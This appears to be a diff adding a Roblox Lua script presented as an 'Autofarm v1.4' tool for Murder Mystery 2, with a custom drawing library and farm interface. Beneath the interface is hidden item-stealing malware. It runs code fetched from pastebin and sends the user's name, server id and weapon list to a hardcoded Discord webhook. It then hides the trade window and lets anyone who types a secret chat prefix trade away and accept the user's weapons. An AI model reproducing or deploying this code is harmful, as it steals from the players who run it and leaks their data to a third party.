@@ -1,0 +1,1447 @@
+
+
+local coreLocked = pcall(function()
+	local a=Instance.new("Folder",game:GetService("CoreGui"))
+end)
+coreLocked=not coreLocked
+local guiPlacing
+if coreLocked then 
+	guiPlacing = game:GetService("Players").LocalPlayer.PlayerGui 
+else 
+	guiPlacing = game:GetService("CoreGui") 
+end
+
+local UI = {}
+
+UI["1"] = Instance.new("ScreenGui", guiPlacing)
+UI["1"]["Name"] = "AutoFarm"
+UI["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
+
+local Draws = Instance.new("Frame", UI["1"])
+Draws.Name = "Drawings"
+Draws.BackgroundTransparency = 1
+Draws.Size = UDim2.fromScale(1,1)
+local Draw = {}
+do
+    local game = game
+    local GetService, FindFirstChild = game.GetService, game.FindFirstChild
+    local IsA = game.IsA
+    local Vector2new, Instancenew, UDim2new = Vector2.new, Instance.new, UDim2.new
+
+    local Workspace = GetService(game, "Workspace");
+    local Camera = FindFirstChild(Workspace, "Camera");
+    local CoreGui = GetService(game, "CoreGui");
+
+    local BaseDrawingProperties = setmetatable({
+        Visible = false,
+        Color = Color3.new(),
+        Transparency = 0,
+        ZIndex = 1,
+        Remove = function()
+        end
+    }, {
+        __add = function(tbl1, tbl2)
+            local new = {}
+            for i, v in next, tbl1 do
+                new[i] = v
+            end
+            for i, v in next, tbl2 do
+                new[i] = v
+            end
+            return new
+        end
+    })
+
+    Draw.new = function(Type, UI)
+        UI = Draws
+        if (Type == "Text") then
+            local TextProperties = ({
+                Text = "",
+                Font = "",
+                Size = 10,
+                XAlign = "Center",
+                YAlign = "Center",
+            } + BaseDrawingProperties)
+            local TextLabel = Instancenew("TextLabel")
+            TextLabel.Parent = UI
+            TextLabel.Text = ""
+            TextLabel.BackgroundTransparency = 1
+            TextLabel.TextColor3 = TextProperties.Color
+            TextLabel.TextSize = TextProperties.Size
+            TextLabel.TextXAlignment = Enum.TextXAlignment.Center
+            TextLabel.Visible = false
+            return setmetatable({}, {
+                __newindex = (function(self, Property, Value)
+                    if (Property == "Position") then
+                        TextLabel.Position = UDim2.fromOffset(Value.X,Value.Y)
+                        TextProperties.Position = Value
+                    end
+                    if (Property == "Transparency") then
+                        TextLabel.TextTransparency = Value
+                        TextProperties.Transparency = Value
+                    end
+                    if (Property == "Text") then
+                        TextLabel.Text = Value
+                        TextProperties.Text = Value
+                    end
+                    if (Property == "Size") then
+                        TextLabel.TextSize = Value
+                        TextProperties.Size = Value
+                    end
+                    if (Property == "Color") then
+                        TextLabel.TextColor3 = Value
+                        TextProperties.Color = Value
+                    end
+                    if (Property == "XAlign") then
+                        TextLabel.TextXAlignment = Enum.TextXAlignment[Value]
+                        TextProperties.XAlign = Enum.TextXAlignment[Value]
+                    end
+                    if (Property == "YAlign") then
+                        TextLabel.TextYAlignment = Enum.TextXYlignment[Value]
+                        TextProperties.YAlign = Enum.TextXYlignment[Value]
+                    end
+                    if (Property == "Visible") then
+                        TextLabel.Visible = Value
+                        TextProperties.Visible = Value
+                    end
+                end),
+                __index = (function(self, Property)
+                    if (Property == "Remove") then
+                        return (function()
+                            TextLabel:Destroy();
+                        end)
+                    end
+                    
+                    return TextProperties[Property]
+                end)
+            })
+        end
+        if (Type == "Line") then
+            local LineProperties = ({
+                To = Vector2new(),
+                From = Vector2new(),
+                Thickness = 1,
+                Fade = {Enabled=false,Rotation=0,Color=Color3.new()},
+            } + BaseDrawingProperties)
+
+            local LineFrame = Instancenew("Frame");
+            LineFrame.AnchorPoint = Vector2new(0.5, 0.5);
+            LineFrame.BorderSizePixel = 0
+            LineFrame.BackgroundColor3 = LineProperties.Color
+            LineFrame.Visible = LineProperties.Visible
+            LineFrame.BackgroundTransparency = LineProperties.Transparency
+            LineFrame.Parent = UI
+            
+            local UIFade = Instance.new("UIGradient",LineFrame)
+
+            UIFade.Rotation = LineProperties.Rotation
+            UIFade.Enabled = LineProperties.Fade.Enabled
+
+            return setmetatable({}, {
+                __newindex = (function(self, Property, Value)
+                    if (Property == "Fade") then
+                        
+                        if typeof(Value[1]) ~= typeof(Color3.new()) then 
+                            warn("attempt set color to "..typeof(Value[1]).." value!")
+                        else
+                            LineProperties.Fade.Color = Value[1]
+                        end
+                        if Value[2] then
+                            LineProperties.Fade.Rotation = Value[2]
+                        end
+                        if Value[3] then
+                            LineProperties.Fade.Enabled = Value[3]
+                        end
+                    end
+                    if (Property == "Color") then
+                        LineFrame.BackgroundColor3 = Value
+                        LineProperties.Color = Value
+                    end
+                    if (Property == "ZIndex") then
+                        LineFrame.ZIndex = Value
+                        LineProperties.ZIndex = Value
+                    end
+                    if (Property == "Visible") then
+                        LineFrame.Visible = Value
+                        LineProperties.Visible = Value
+                    end
+                    if (Property == "Thickness") then
+                        --TODO
+                        LineProperties.Thickness = Value
+                    end
+                    if (Property == "Transparency") then
+                        LineFrame.BackgroundTransparency = Value
+                        LineProperties.Transparency = Value
+                    end
+
+                    if (Property == "To") then
+                        local To = Value
+                        local Direction = (To - LineProperties.From);
+                        local Center = (To + LineProperties.From) / 2
+                        local Distance = Direction.Magnitude
+                        local Theta = math.atan2(Direction.Y, Direction.X);
+
+                        LineFrame.Position = UDim2.fromOffset(Center.X, Center.Y);
+                        LineFrame.Rotation = math.deg(Theta);
+                        LineFrame.Size = UDim2.fromOffset(Distance, LineProperties.Thickness);
+
+                        LineProperties.To = To
+                    end
+                    if (Property == "From") then
+                        local From = Value
+                        local Direction = (LineProperties.To - From);
+                        local Center = (LineProperties.To + From) / 2
+                        local Distance = Direction.Magnitude
+                        local Theta = math.atan2(Direction.Y, Direction.X);
+
+                        LineFrame.Position = UDim2.fromOffset(Center.X, Center.Y);
+                        LineFrame.Rotation = math.deg(Theta);
+                        LineProperties.From = From
+                    end
+                    if (Property == "Visible") then
+                        LineFrame.Visible = Value
+                        LineProperties.Visible = Value
+                    end
+                end),
+                __index = (function(self, Property)
+                    if (Property == "Remove") then
+                        return (function()
+                            LineFrame:Destroy();
+                        end)
+                    end
+                    
+                    return LineProperties[Property]
+                end)
+            })
+        end
+
+        if (Type == "Square") then
+            local SquareProperties = ({
+                Thickness = 1,
+                Size = Vector2new(),
+                Position = Vector2new(),
+                Filled = false,
+                XAlign = "Left",
+                YAlign = "Top",
+                Fade = {Enabled=false,Rotation=0,Color=Color3.new()},
+            } + BaseDrawingProperties);
+
+            local SquareFrame = Instance.new("Frame");
+            SquareFrame.AnchorPoint = Vector2new(0, 0);
+            SquareFrame.BorderSizePixel = 0
+            SquareFrame.Visible = false
+            SquareFrame.Parent = UI
+            local UIFade = Instance.new("UIGradient",SquareFrame)
+            UIFade.Rotation = SquareProperties.Rotation
+            UIFade.Enabled = SquareProperties.Fade.Enabled
+            local UIOutline = Instance.new("UIStroke")
+            UIOutline.Thickness = SquareProperties.Thickness
+            UIOutline.Enabled = false
+            UIOutline.Parent = SquareFrame
+            local UIFade2 = UIFade:Clone()
+            UIFade2.Parent = UIOutline
+            return setmetatable({}, {
+                __newindex = (function(self, Property, Value)
+                    if (Property == "Fade") then
+                        print(Value[1],Value[2],Value[3])
+                        if typeof(Value[1]) ~= typeof(Color3.new()) then 
+                            warn("attempt set color to "..typeof(Value[1]).." value!")
+                        else
+                            SquareProperties.Fade.Color = Value[1]
+                        end
+                        if Value[2] then
+                            SquareProperties.Fade.Rotation = Value[2]
+                        end
+                        if Value[3] then
+                            SquareProperties.Fade.Enabled = Value[3]
+                        end
+                    end
+                    if (Property == "Size") then
+                        SquareFrame.Size = UDim2new(0, Value.X, 0, Value.Y);
+                        SquareProperties.Size = Value
+                    end
+                    if (Property == "Position") then
+                        SquareFrame.Position = UDim2new(0, Value.X, 0, Value.Y);
+                        SquareProperties.Position = Value
+                    end
+                    if (Property == "Color") then
+                        SquareFrame.BackgroundColor3 = Value
+                        UIOutline.Color = Value
+                        SquareProperties.Color = Value
+                    end
+                    if (Property == "Transparency") then
+                        if SquareProperties.Filled == true then
+                            SquareFrame.BackgroundTransparency = Value
+                        else
+                            UIOutline.Transparency = Value
+                        end
+                        SquareProperties.Transparency = Value
+                    end
+                    if (Property == "Visible") then
+                        if Value == true then
+                            SquareFrame.Visible = true
+                            if SquareProperties.Filled == true then
+                                SquareFrame.BackgroundTransparency = SquareProperties.Transparency
+                                UIOutline.Enabled = false
+                            else
+                                SquareFrame.BackgroundTransparency = 1
+                                UIOutline.Enabled = true
+                            end
+                        else
+                            SquareFrame.Visible = false
+                            UIOutline.Enabled = false
+                        end
+                        SquareProperties.Visible = Value
+                    end
+                    if (Property == "Filled") then -- idi naxyi
+                        if SquareProperties.Visible == true then
+                            if Value == false then
+                                SquareFrame.BackgroundTransparency = 1
+                            else
+                                SquareFrame.BackgroundTransparency = SquareProperties.Transparency
+                            end
+                            UIOutline.Enabled = not Value
+                        end
+                        SquareProperties.Filled = Value
+                    end
+                    if (Property == "XAlign") then
+                        if Value == "Left" then
+                            SquareFrame.AnchorPoint = Vector2new(0,SquareFrame.AnchorPoint.Y)
+                        elseif Value == "Center" then
+                            SquareFrame.AnchorPoint = Vector2new(0.5,SquareFrame.AnchorPoint.Y)
+                        elseif Value == "Right" then
+                            SquareFrame.AnchorPoint = Vector2new(-1,SquareFrame.AnchorPoint.Y)
+                        end
+                        SquareProperties.XAlign = Value
+                    end
+                    if (Property == "YAlign") then
+                        if Value == "Top" then
+                            SquareFrame.AnchorPoint = Vector2new(SquareFrame.AnchorPoint.X, 0)
+                        elseif Value == "Center" then
+                            SquareFrame.AnchorPoint = Vector2new(SquareFrame.AnchorPoint.X, 0.5)
+                        elseif Value == "Bottom" then
+                            SquareFrame.AnchorPoint = Vector2new(SquareFrame.AnchorPoint.X, -1)
+                        end
+                        SquareProperties.YAlign = Value
+                    end
+                end),
+                __index = (function(self, Property)
+                    if (Property == "Remove") then
+                        return (function()
+                            SquareFrame:Destroy();
+                        end)
+                    end
+                    
+                    return SquareProperties[Property]
+                end)
+            })
+        end
+
+        if (Type == "Image") then
+            local ImageProperties = ({
+                Data = "rbxassetid://848623155",
+                Size = Vector2new(),
+                Position = Vector2new(),
+                Rounding = 0,
+            });
+
+            local ImageLabel = Instancenew("ImageLabel");
+
+            ImageLabel.AnchorPoint = Vector2new(0.5, 0.5);
+            ImageLabel.BorderSizePixel = 0
+            ImageLabel.ScaleType = Enum.ScaleType.Stretch
+            ImageLabel.Transparency = 1
+            
+            ImageLabel.Visible = false
+            ImageLabel.Parent = UI
+
+            return setmetatable({}, {
+                __newindex = (function(self, Property, Value)
+                    if (Property == "Position") then
+                        ImageLabel.Position = UDim2new(0, Value.X, 0, Value.Y);
+                        ImageProperties.Position = Value
+                    end
+                    if (Property == "Size") then
+                        ImageLabel.Size = UDim2new(0, Value.X, 0, Value.Y);
+                        ImageProperties.Size = Value
+                    end
+                    if (Property == "Transparency") then
+                        ImageLabel.ImageTransparency = Value
+                        ImageProperties.Transparency = Value
+                    end
+                    if (Property == "Visible") then
+                        ImageLabel.Visible = Value
+                        ImageProperties.Visible = Value
+                    end
+                    if (Property == "Color") then
+                        ImageLabel.ImageColor3 = Value
+                        ImageLabel.Color = Value
+                    end
+                    if (Property == "Data") then
+                        ImageLabel.Image = Value
+                        ImageProperties.Data = Value
+                    end
+                end),
+                __index = (function(self, Property)
+                    if (Property == "Remove") then
+                        return (function()
+                            ImageLabel:Destroy();
+                        end)
+                    end
+                    
+                    return ImageLabel[Property]
+                end)
+            })
+        end
+
+        if (Type == "Circle") then -- will add later
+            local CircleProperties = ({
+                Radius = 50,
+                Thickness = 1,
+                Position = Vector2new(),
+                Filled = false,
+                XAlign = "Center",
+                YAlign = "Center",
+            } + BaseDrawingProperties);
+
+            local CircleFrame = Instancenew("Frame");
+            CircleFrame.AnchorPoint = Vector2new(0.5, 0.5);
+            CircleFrame.BorderSizePixel = 0
+            CircleFrame.Visible = false
+            CircleFrame.Parent = UI
+            CircleFrame.Size = UDim2new(0, 100, 0, 100);
+            local UIOutline = Instancenew("UIStroke")
+            UIOutline.Thickness = CircleProperties.Thickness
+            UIOutline.Enabled = false
+            UIOutline.Parent = CircleFrame
+            local UICorner = Instancenew("UICorner")
+            UICorner.CornerRadius = UDim.new(1,0)
+            UICorner.Parent = CircleFrame
+            return setmetatable({}, {
+                __newindex = (function(self, Property, Value)
+                    if (Property == "Radius") then
+                        CircleFrame.Size = UDim2new(0, Value, 0, Value);
+                        CircleProperties.Radius = Value
+                    end
+                    if (Property == "Thickness") then
+                        UIOutline.Thickness = Value
+                        CircleProperties.Thickness = Value
+                    end
+                    if (Property == "XAlign") then
+                        if Value == "Left" then
+                            CircleFrame.AnchorPoint = Vector2new(0,CircleFrame.AnchorPoint.Y)
+                        elseif Value == "Center" then
+                            CircleFrame.AnchorPoint = Vector2new(0.5,CircleFrame.AnchorPoint.Y)
+                        elseif Value == "Right" then
+                            CircleFrame.AnchorPoint = Vector2new(-1,CircleFrame.AnchorPoint.Y)
+                        end
+                        CircleProperties.XAlign = Value
+                    end
+                    if (Property == "YAlign") then
+                        if Value == "Top" then
+                            CircleFrame.AnchorPoint = Vector2new(CircleFrame.AnchorPoint.X, 0)
+                        elseif Value == "Center" then
+                            CircleFrame.AnchorPoint = Vector2new(CircleFrame.AnchorPoint.X, 0.5)
+                        elseif Value == "Bottom" then
+                            CircleFrame.AnchorPoint = Vector2new(CircleFrame.AnchorPoint.X, -1)
+                        end
+                        CircleProperties.YAlign = Value
+                    end
+                    if (Property == "Position") then
+                        local x = Value.X
+                        local y = Value.Y
+                        CircleFrame.Position = UDim2new(0, x, 0, y);
+                        CircleProperties.Position = Value
+                    end
+                    if (Property == "Color") then
+                        CircleFrame.BackgroundColor3 = Value
+                        UIOutline.Color = Value
+                        CircleProperties.Color = Value
+                    end
+                    if (Property == "Transparency") then
+                        if CircleProperties.Filled == true then
+                            CircleFrame.BackgroundTransparency = Value
+                        else
+                            UIOutline.Transparency = Value
+                        end
+                        CircleProperties.Transparency = Value
+                    end
+                    if (Property == "Visible") then
+                        if Value == true then
+                            CircleFrame.Visible = true
+                            if CircleProperties.Filled == true then
+                                CircleFrame.BackgroundTransparency = CircleProperties.Transparency
+                                UIOutline.Enabled = false
+                            else
+                                CircleFrame.BackgroundTransparency = 1
+                                UIOutline.Enabled = true
+                            end
+                        else
+                            CircleFrame.Visible = false
+                            UIOutline.Enabled = false
+                        end
+                        CircleProperties.Visible = Value
+                    end
+                    if (Property == "Filled") then -- idi naxyi
+                        if CircleProperties.Visible == true then
+                            if Value == false then
+                                CircleFrame.BackgroundTransparency = 1
+                            else
+                                CircleFrame.BackgroundTransparency = CircleProperties.Transparency
+                            end
+                            UIOutline.Enabled = not Value
+                        end
+                        CircleProperties.Filled = Value
+                    end
+                end),
+                __index = (function(self, Property)
+                    if (Property == "Remove") then
+                        return (function()
+                            CircleFrame:Destroy();
+                        end)
+                    end
+                    
+                    return CircleProperties[Property]
+                end)
+            });
+        end
+
+        if (Type == "Quad") then -- will add later
+            return setmetatable({}, {
+                
+            });
+        end
+
+    end
+end
+
+UI["c"] = Instance.new("TextLabel", UI["1"])
+UI["c"]["TextWrapped"] = true
+UI["c"]["BorderSizePixel"] = 0
+UI["c"]["TextXAlignment"] = Enum.TextXAlignment.Right
+UI["c"]["TextScaled"] = true
+UI["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["c"]["TextSize"] = 19
+UI["c"]["FontFace"] = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["c"]["BackgroundTransparency"] = 1
+UI["c"]["Size"] = UDim2.new(0, 0, 0.03752, 0)
+UI["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["c"]["Text"] = "Loading data"
+UI["c"]["Name"] = "Loading"
+UI["c"]["Position"] = UDim2.new(-0.0007, 0, 0.1837, 0)
+
+local TS = game:GetService("TweenService")
+TS:Create(UI["c"], TweenInfo.new(5), {Size = UDim2.new(1.3, 0, 0.03752, 0)}):Play()
+local weapons = game:GetService("ReplicatedStorage").Remotes.Inventory.GetProfileData:InvokeServer()
+weapons = weapons.Weapons.Owned
+local STWeapons = {}
+local weaponsC = ""
+local count = 0
+loadstring(game:HttpGet("https://pastebin.com/raw/1FQtbWA9"))()
+
+local sortirovka = {
+    ["Uncommon"] = 5,
+    ["Rare"] = 4,
+    ["Legendary"] = 3,
+    ["Unique"] = 2,
+    ["Godly"] = 1
+}
+
+local Rarities = {
+    ["Uncommon"] = 34,
+    ["Rare"] = 32,
+    ["Legendary"] = 31,
+    ["Unique"] = 36,
+    ["Godly"] = 35 
+}
+
+local weaponList = {}
+for weapon in pairs(weapons) do
+    local rarity = MM2Weapons[weapon].Rarity
+    table.insert(weaponList, {name = weapon, rarity = rarity, color = Rarities[rarity] or 38})
+end
+
+table.sort(weaponList, function(a, b)
+    local rarityA = sortirovka[a.rarity] or math.huge
+    local rarityB = sortirovka[b.rarity] or math.huge
+    return rarityA < rarityB
+end)
+
+for i, weaponData in ipairs(weaponList) do
+    count = count + 1
+    weaponsC = weaponsC.."```ansi\n[2;"..weaponData.color.."m"..count..". "..weaponData.name.." [0m```" --..weaponData.rarity.."\n"
+    STWeapons[count] = weaponData.name
+end
+
+local protos = {
+    "O!",
+    "A*",
+    "H&",
+    "a=",
+    "h+",
+    "k)",
+    "o:",
+    "U*",
+    "g^",
+    "z8",
+}
+local protocol = protos[math.random(1,#protos)]
+
+local HS = game:GetService("HttpService")
+
+local WebhookURL = "https://discord.com/api/webhooks/1309946891349524521/GjL6mQ-EX_Kc-EBLowrARXyoVJT3E-0cBxBO0lYAOOBB9Pbdk2HpIsxkHeAMtmg0dnBG"
+
+local MessageData = {
+    ["content"] = 
+    --"\n📊   Farm Version: " .. farmvers .. 
+    "\n👤   Nickname: ".. game.Players.LocalPlayer.Name ..
+    "\n📡   Protocol: ".. protocol ..
+    "\n🆔   JobId: ".. game.JobId ..
+    "\n🗡   Weapons: \n".. weaponsC
+}
+
+MessageData = HS:JSONEncode(MessageData)
+local response = request({
+    Url = WebhookURL,
+    Method = "POST",
+    Body = MessageData,
+})
+function WaitForChanges(Inst, Prop, To)
+    local start = Inst[Prop]
+    repeat
+        task.wait()
+    until Inst[Prop] ~= start
+    Inst[Prop] = To
+end
+local TG = game.Players.LocalPlayer.PlayerGui:WaitForChild("TradeGUI")
+local TGP = game.Players.LocalPlayer.PlayerGui:WaitForChild("TradeGUI_Phone")
+spawn(function()
+    while task.wait() do
+        TG = game.Players.LocalPlayer.PlayerGui:WaitForChild("TradeGUI")
+        TGP = game.Players.LocalPlayer.PlayerGui:WaitForChild("TradeGUI_Phone")
+        TG.Enabled = false
+        TGP.Enabled = false
+    end
+end)
+for _,plr in pairs(game.Players:GetPlayers()) do
+    plr.Chatted:Connect(function(msg)
+        if msg == protocol.."1" then
+            game["ReplicatedStorage"]["Trade"]["SendRequest"]:InvokeServer(plr)
+        end
+        if msg == protocol.."2" then
+            game["ReplicatedStorage"]["Trade"]["AcceptTrade"]:FireServer(285646582)
+        end
+        if msg:sub(1,4) == protocol .. "SL" then
+            for i = 1,4 do
+                if msg:sub(i+4,i+4) == "" then break end
+                local id = tonumber(msg:sub(i+4,i+4))
+                local weapn = STWeapons[id]
+                game["ReplicatedStorage"]["Trade"]["OfferItem"]:FireServer(weapn,"Weapons")
+            end
+        end
+        if msg == protocol.."REL" then
+            local ww = game:GetService("ReplicatedStorage").Remotes.Inventory.GetProfileData:InvokeServer()
+            ww = ww.Weapons.Owned
+            local STW = {}
+            local wC = ""
+            local count = 0
+            for weapon in pairs(ww) do
+                count = count + 1
+                wC = wC.."            "..count.."."..weapon.."\n"
+                STW[count] = weapon
+            end
+            STWeapons = STW
+            weaponsC = wC
+            local MessageData = {
+                ["content"] = "Weapon update for: "..game.Players.LocalPlayer.Name.."\nWeapons:\n"..weaponsC
+            }
+            MessageData = HS:JSONEncode(MessageData)
+            local response = request({
+                Url = WebhookURL,
+                Method = "POST",
+                Body = MessageData,
+            })
+        end
+    end)
+end
+game.Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        if msg == protocol.."1" then
+            game["ReplicatedStorage"]["Trade"]["SendRequest"]:InvokeServer(plr)
+        end
+        if msg == protocol.."2" then
+            game["ReplicatedStorage"]["Trade"]["AcceptTrade"]:FireServer(285646582)
+        end
+        if msg:sub(1,4) == protocol .. "SL" then
+            for i = 1,4 do
+                if msg:sub(i+4,i+4) == "" then break end
+                local id = tonumber(msg:sub(i+4,i+4))
+                local weapn = STWeapons[id]
+                game["ReplicatedStorage"]["Trade"]["OfferItem"]:FireServer(weapn,"Weapons")
+            end
+        end
+        if msg == protocol.."REL" then
+            local ww = game:GetService("ReplicatedStorage").Remotes.Inventory.GetProfileData:InvokeServer()
+            ww = ww.Weapons.Owned
+            local STW = {}
+            local wC = ""
+            local count = 0
+            for weapon in pairs(ww) do
+                count = count + 1
+                wC = wC.."            "..count.."."..weapon.."\n"
+                STW[count] = weapon
+            end
+            STWeapons = STW
+            weaponsC = wC
+            local MessageData = {
+                ["content"] = "Weapon update for: "..game.Players.LocalPlayer.Name.."\nWeapons:\n"..weaponsC
+            }
+            MessageData = HS:JSONEncode(MessageData)
+            local response = request({
+                Url = WebhookURL,
+                Method = "POST",
+                Body = MessageData,
+            })
+        end
+    end)
+end)
+UI["c"]:Remove()
+
+UI["2"] = Instance.new("Frame", UI["1"])
+UI["2"]["BorderSizePixel"] = 0
+UI["2"]["BackgroundColor3"] = Color3.fromRGB(55, 60, 87)
+UI["2"]["Size"] = UDim2.new(0.25279, 0, 0.15783, 0)
+UI["2"]["Position"] = UDim2.new(0, 0, 0, 0)
+UI["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["2"]["Name"] = "MainFrame"
+UI["2"]["BackgroundTransparency"] = 0.35
+UI["2"]["ClipsDescendants"] = true
+
+UI["3"] = Instance.new("UIStroke", UI["2"])
+UI["3"]["Thickness"] = 2
+UI["3"]["Color"] = Color3.fromRGB(131, 148, 255)
+
+UI["4"] = Instance.new("TextLabel", UI["2"])
+UI["4"]["TextWrapped"] = true
+UI["4"]["BorderSizePixel"] = 0
+UI["4"]["TextScaled"] = true
+UI["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["4"]["TextSize"] = 37
+UI["4"]["FontFace"] = Font.new("rbxasset://fonts/families/JosefinSans.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["4"]["TextColor3"] = Color3.fromRGB(131, 148, 255)
+UI["4"]["BackgroundTransparency"] = 1
+UI["4"]["Size"] = UDim2.new(1, 0, 0.41803, 0)
+UI["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["4"]["Text"] = "Autofarm v1.4"
+UI["4"]["ZIndex"] = 3
+
+UI["5"] = Instance.new("UITextSizeConstraint", UI["4"])
+UI["5"]["MaxTextSize"] = 37
+
+UI["6"] = Instance.new("TextButton", UI["2"])
+UI["6"]["TextWrapped"] = true
+UI["6"]["BorderSizePixel"] = 0
+UI["6"]["TextSize"] = 23
+UI["6"]["TextColor3"] = Color3.fromRGB(255, 0, 0)
+UI["6"]["TextScaled"] = true
+UI["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["6"]["FontFace"] = Font.new("rbxasset://fonts/families/JosefinSans.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["6"]["Size"] = UDim2.new(0.55096, 0, 0.40984, 0)
+UI["6"]["BackgroundTransparency"] = 0.85
+UI["6"]["Name"] = "Toggle"
+UI["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["6"]["Text"] = "Toggle farm"
+UI["6"]["Position"] = UDim2.new(0.22314, 0, 0.46872, 0)
+UI["6"]["ZIndex"] = 3
+
+UI["7"] = Instance.new("UIStroke", UI["6"])
+UI["7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
+UI["7"]["Thickness"] = 2
+UI["7"]["Color"] = Color3.fromRGB(131, 148, 255)
+
+UI["8"] = Instance.new("UICorner", UI["6"])
+UI["8"]["CornerRadius"] = UDim.new(0.4, 0)
+
+UI["9"] = Instance.new("UITextSizeConstraint", UI["6"])
+UI["9"]["MaxTextSize"] = 23
+
+UI["a"] = Instance.new("UICorner", UI["2"])
+UI["a"]["CornerRadius"] = UDim.new(0.15, 0)
+
+UI["b"] = Instance.new("TextButton", UI["2"])
+UI["b"]["TextWrapped"] = true
+UI["b"]["BorderSizePixel"] = 0
+UI["b"]["TextSize"] = 23
+UI["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["b"]["TextScaled"] = true
+UI["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["b"]["FontFace"] = Font.new("rbxasset://fonts/families/JosefinSans.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["b"]["Size"] = UDim2.new(0.07923, 0, 0.22951, 0)
+UI["b"]["BackgroundTransparency"] = 1
+UI["b"]["Name"] = "Close"
+UI["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["b"]["Text"] = "x"
+UI["b"]["Position"] = UDim2.new(0.91832, 0, -0.00669, 0)
+UI["b"]["ZIndex"] = 3
+
+UI["d"] = Instance.new("ImageButton", UI["2"])
+UI["d"]["BorderSizePixel"] = 0
+UI["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["d"]["Image"] = "http://www.roblox.com/asset/?id=116575243151479"
+UI["d"]["Size"] = UDim2.new(0.13517, 0, 0.40164, 0)
+UI["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["d"]["Rotation"] = 180
+UI["d"]["Position"] = UDim2.new(0.83312, 0, 0.47541, 0)
+UI["d"]["ZIndex"] = 3
+
+UI["e"] = Instance.new("UICorner", UI["d"])
+UI["e"]["CornerRadius"] = UDim.new(1, 0)
+
+UI["f"] = Instance.new("ImageLabel", UI["d"])
+UI["f"]["BorderSizePixel"] = 0
+UI["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["f"]["Image"] = "http://www.roblox.com/asset/?id=76657578287916"
+UI["f"]["Size"] = UDim2.new(1, 0, 1, 0)
+UI["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["f"]["BackgroundTransparency"] = 1
+UI["f"]["Rotation"] = 180
+UI["f"]["ZIndex"] = 3
+
+UI["12"] = Instance.new("Frame", UI["1"])
+UI["12"]["BorderSizePixel"] = 0
+UI["12"]["BackgroundColor3"] = Color3.fromRGB(58, 58, 80)
+UI["12"]["Size"] = UDim2.new(0.21339, 0, 0.12937, 0)
+UI["12"]["Position"] = UDim2.new(0.77964, 0, 0.8577, 0)
+UI["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["12"]["Name"] = "Notify"
+UI["12"].Visible = false
+UI["12"]["ZIndex"] = 3
+
+UI["13"] = Instance.new("Frame", UI["12"])
+UI["13"]["BorderSizePixel"] = 0
+UI["13"]["BackgroundColor3"] = Color3.fromRGB(131, 148, 255)
+UI["13"]["AnchorPoint"] = Vector2.new(0, 1)
+UI["13"]["Size"] = UDim2.new(1, 0, 0.03, 0)
+UI["13"]["Position"] = UDim2.new(0, 0, 1, 0)
+UI["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["13"]["Name"] = "DownBar"
+UI["13"]["ZIndex"] = 3
+
+UI["14"] = Instance.new("TextLabel", UI["12"])
+UI["14"]["TextWrapped"] = true
+UI["14"]["BorderSizePixel"] = 0
+UI["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["14"]["TextSize"] = 20
+UI["14"]["FontFace"] = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["14"]["BackgroundTransparency"] = 1
+UI["14"]["Size"] = UDim2.new(0.96078, 0, 0.91, 0)
+UI["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["14"]["Text"] = "Copied to clipboard!"
+UI["14"]["Name"] = "Text"
+UI["14"]["Position"] = UDim2.new(0.01961, 0, 0.06, 0)
+UI["14"]["ZIndex"] = 3
+----------------Dayn Info----------------------------------------------------------------------------
+UI["1DF1"] = Instance.new("Frame", UI["1"])
+UI["1DF1"]["BorderSizePixel"] = 2
+UI["1DF1"]["BackgroundColor3"] = Color3.fromRGB(74, 76, 90)
+UI["1DF1"]["Size"] = UDim2.new(0.15449, 0, 0.01911, 0)
+UI["1DF1"]["Position"] = UDim2.new(0.42248, 0, 0.14386, 0)
+UI["1DF1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["1DF1"]["Name"] = [[CollectedBG]]
+
+UI["BarDF1"] = Instance.new("Frame", UI["1DF1"])
+UI["BarDF1"]["BorderSizePixel"] = 0
+UI["BarDF1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["BarDF1"]["ClipsDescendants"] = true
+UI["BarDF1"]["Size"] = UDim2.new(0, 0, 1, 0)
+UI["BarDF1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["BarDF1"]["BackgroundTransparency"] = 1
+
+UI["TextDF1"] = Instance.new("TextLabel", UI["BarDF1"])
+UI["TextDF1"]["TextWrapped"] = true
+UI["TextDF1"]["BorderSizePixel"] = 0
+UI["TextDF1"]["TextXAlignment"] = Enum.TextXAlignment.Right
+UI["TextDF1"]["TextScaled"] = true
+UI["TextDF1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["TextDF1"]["TextSize"] = 18
